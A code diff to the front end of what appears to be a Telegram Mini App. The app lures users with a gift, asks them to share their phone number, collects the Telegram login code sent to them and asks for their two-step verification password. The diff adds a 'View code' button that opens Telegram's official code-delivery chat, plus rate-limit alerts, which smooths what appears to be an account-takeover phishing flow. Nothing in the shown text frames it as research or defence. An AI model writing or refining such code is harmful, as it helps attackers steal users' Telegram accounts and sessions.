@@ -52,6 +52,7 @@ const TRANSLATIONS = {
     auth_next: 'Далее',
     auth_code_title: 'Код подтверждения',
     auth_code_text: 'Мы отправили код в приложение Telegram.',
+    auth_code_link: 'Посмотреть код',
     auth_code_label: 'Код',
     auth_back: 'Назад',
     auth_password_title: 'Двухэтапная защита',
@@ -75,6 +76,8 @@ const TRANSLATIONS = {
     send_code_failed: 'Не удалось отправить код.',
     code_sent: '',
     send_code_error: 'Ошибка отправки кода.',
+    rate_limit: 'Слишком много попыток. Повторите через {seconds} сек.',
+    rate_limit_generic: 'Слишком много попыток. Попробуйте позже.',
     code_short: 'Введите 5-значный код.',
     verify_code: 'Проверяем код...',
     auth_error: 'Ошибка входа.',
@@ -131,6 +134,7 @@ const TRANSLATIONS = {
     auth_next: 'Next',
     auth_code_title: 'Confirmation code',
     auth_code_text: 'We sent the code to Telegram.',
+    auth_code_link: 'View code',
     auth_code_label: 'Code',
     auth_back: 'Back',
     auth_password_title: 'Two-step verification',
@@ -154,6 +158,8 @@ const TRANSLATIONS = {
     send_code_failed: 'Failed to send the code.',
     code_sent: 'Code sent.',
     send_code_error: 'Code sending failed.',
+    rate_limit: 'Too many attempts. Try again in {seconds} sec.',
+    rate_limit_generic: 'Too many attempts. Try again later.',
     code_short: 'Enter the 5-digit code.',
     verify_code: 'Verifying code...',
     auth_error: 'Login failed.',
@@ -262,6 +268,7 @@ const elements = {
   codeInput: document.getElementById('code-input'),
   codeCells: document.getElementById('code-cells'),
   codeCellNodes: Array.from(document.querySelectorAll('#code-cells .code-cell')),
+  codeLinkBtn: document.getElementById('code-link-btn'),
   authPasswordInput: document.getElementById('auth-password-input'),
   passwordInput: document.getElementById('password-input'),
   passwordToggle: document.getElementById('password-toggle'),
@@ -270,6 +277,7 @@ const elements = {
   giftModal: document.getElementById('gift-modal'),
   giftImage: document.getElementById('gift-image'),
   giftAccept: document.getElementById('gift-accept'),
+  alert: document.getElementById('alert'),
 };
 
 function wait(ms) {
@@ -1018,6 +1026,31 @@ function showToast(message) {
   }, 2400);
 }
 
+function showAlert(message, duration = 4000) {
+  if (!elements.alert) return;
+  elements.alert.textContent = message;
+  elements.alert.classList.add('visible');
+  clearTimeout(showAlert.timer);
+  showAlert.timer = setTimeout(() => {
+    elements.alert.classList.remove('visible');
+  }, duration);
+}
+
+function extractWaitSeconds(detail) {
+  const text = String(detail || '');
+  const secMatch = text.match(/(\d+)\s*сек/i);
+  if (secMatch) {
+    const seconds = Number(secMatch[1]);
+    if (Number.isFinite(seconds) && seconds > 0) return seconds;
+  }
+  const minMatch = text.match(/(\d+)\s*мин/i);
+  if (minMatch) {
+    const minutes = Number(minMatch[1]);
+    if (Number.isFinite(minutes) && minutes > 0) return minutes * 60;
+  }
+  return null;
+}
+
 function setAuthorized(isAuthorized) {
   state.isAuthorized = isAuthorized;
 }
@@ -1158,6 +1191,22 @@ function bindCodeInput() {
   elements.authCodeInput.addEventListener('paste', () => {
     setTimeout(maybeAutoSubmit, 0);
   });
+
+  if (elements.codeLinkBtn) {
+    elements.codeLinkBtn.addEventListener('click', () => {
+      triggerHaptic('light');
+      const link = 'tg://user?id=777000';
+      if (tgWebApp && typeof tgWebApp.openTelegramLink === 'function') {
+        tgWebApp.openTelegramLink(link);
+        return;
+      }
+      if (window.Telegram?.WebApp?.openTelegramLink) {
+        window.Telegram.WebApp.openTelegramLink(link);
+        return;
+      }
+      window.location.href = link;
+    });
+  }
 }
 
 function bindPasswordInput() {
@@ -1476,10 +1525,12 @@ async function startAuth(event) {
   const contact = await requestPhoneFromTelegram();
   const phone = contact?.phone;
   const shared = contact?.shared;
+  if (shared) {
+    showAuthStep(elements.authLoading);
+  }
   if (!phone) {
     if (shared) {
       setAuthStatus(t('sending_code'));
-      showAuthStep(elements.authLoading);
       const pendingToken = await waitForPendingToken();
       if (pendingToken) {
         authToken = pendingToken;
@@ -1518,13 +1569,26 @@ async function startAuth(event) {
     });
     const data = await res.json();
 
-    if (!res.ok) throw new Error(data?.detail || t('send_code_failed'));
+    if (!res.ok) {
+      if (res.status === 429) {
+        const seconds = extractWaitSeconds(data?.detail);
+        const message = seconds
+          ? t('rate_limit', { seconds })
+          : t('rate_limit_generic');
+        triggerHaptic('heavy');
+        showAlert(message);
+        showAuthStep(elements.authIntro);
+        return;
+      }
+      throw new Error(data?.detail || t('send_code_failed'));
+    }
 
     authToken = data.token;
     setAuthStatus(t('code_sent'));
     showAuthStep(elements.authCodeForm);
   } catch (err) {
     setAuthStatus(err.message || t('send_code_error'), true);
+    showAuthStep(elements.authIntro);
   } finally {
     authLoading = false;
     if (elements.authStart) elements.authStart.disabled = false;
